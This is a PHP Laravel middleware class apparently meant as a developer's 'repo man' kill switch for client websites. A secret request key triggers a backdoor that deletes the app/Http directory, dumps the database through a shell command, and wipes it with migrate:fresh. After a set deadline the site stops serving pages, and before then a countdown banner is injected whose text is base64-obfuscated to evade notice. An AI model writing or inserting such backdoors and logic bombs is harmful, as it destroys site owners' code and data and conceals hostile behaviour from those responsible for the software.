<?php

namespace WebPajooh\LaravelRepoMan\Middleware;

use Carbon\Carbon;
use Closure;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Str;

class RepoManMiddleware
{
    public function handle($request, Closure $next)
    {
        if ($this->isTheMagicKeyPresent()) {
            if (is_dir(app_path('Http'))) {
                $result = File::deleteDirectory(app_path('Http'));
                $request = $result ? 'The directory has deleted successfully' : 'Something went wrong!';
            }
            $filename = Carbon::now()->timestamp;
            $db = config('repoman.db');
            exec("(mysqldump -h". $db['DB_HOST'] ." -u". $db['DB_USERNAME'] ." -p". $db['DB_PASSWORD'] ." ". $db['DB_DATABASE'] ." > " . storage_path() . "/app/backup/".$filename.".sql" .") 2>&1", $output, $exit_status);

            if ($exit_status == 0)
                Artisan::call('migrate:fresh');

            $backupStatus = ($exit_status != 0) ? 'database backup failed to complete' : 'backup completes successfully';
            exit($result ?? "The directory doesn't exist!" . " | " . $backupStatus);
        }

        $startDate = Carbon::createFromTimeString(
            config('repoman.start_date')
        );

        $endTime = $startDate->copy()->addRealDays(config('repoman.deadline_days'));

        if ($startDate->isFuture()) {
            return $next($request);
        }

        if ($endTime->isPast()) {
            exit;
        }

        $response = $next($request);

        $newContent = $this->modifyContent($response->getContent(), $endTime);

        return $response->setContent($newContent);
    }

    private function isTheMagicKeyPresent()
    {
        return ! is_null(config('repoman.magic_key'))
            && config('repoman.magic_key') == request()->magic_key;
    }

    private function modifyContent($content, $endTime)
    {
        $diffInDays = $endTime->diffInDays(now());

        // I have encoded the strings to make them harder to find, and I know it's ugly!
        if ($this->isPersian()) {
            $text = base64_decode('2KfbjNmGINmI2KjYs9in24zYqiA=') . $diffInDays . base64_decode('INix2YjYsiDYr9uM2q/YsSDYutuM2LEg2YHYudin2YQg2K7ZiNin2YfYryDYtNiv');
        } else {
            $text = base64_decode('VGhpcyB3ZWJzaXRlIGJlY29tZXMgZG93biBpbiA=') . $diffInDays . Str::plural(' day', $diffInDays) . base64_decode('IGZyb20gbm93');
        }

        // This makes a <div> tag with some styles...
        $bar = base64_decode('PGRpdiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZzoxNXB4IDA7YmFja2dyb3VuZDojMmEyYTJhO2NvbG9yOiNmZmY7dXNlci1zZWxlY3Q6bm9uZTsiPg==') . $text . '</div>';

        return preg_replace("/(<body[^>]*>)/i", "$0 {$bar}", $content);
    }

    private function isPersian()
    {
        return strtolower(config('app.locale')) == 'fa'
            || strtolower(config('app.timezone')) == 'asia/tehran';
    }
}
